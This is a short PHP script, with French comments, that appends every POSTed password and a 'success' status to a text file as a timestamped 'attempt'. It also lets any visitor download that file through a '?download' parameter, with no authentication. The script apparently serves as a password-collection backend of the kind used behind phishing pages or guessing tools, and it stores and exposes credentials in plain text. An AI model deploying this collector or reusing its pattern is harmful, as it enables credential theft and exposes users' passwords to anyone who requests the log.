<?php

$file = 'log.txt';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $password = $_POST["password"];
    $success = $_POST["success"];
    $timestamp = date("Y-m-d H:i:s");
    
    $log_entry = "$timestamp - Tentative: $password - Status: $success\n";
    file_put_contents("log.txt", $log_entry, FILE_APPEND);
}

// Permet le téléchargement du fichier log.txt
if (isset($_GET['download'])) {
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: text/plain');
        header('Content-Disposition: attachment; filename="log.txt"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "Fichier introuvable.";
    }
}

?>
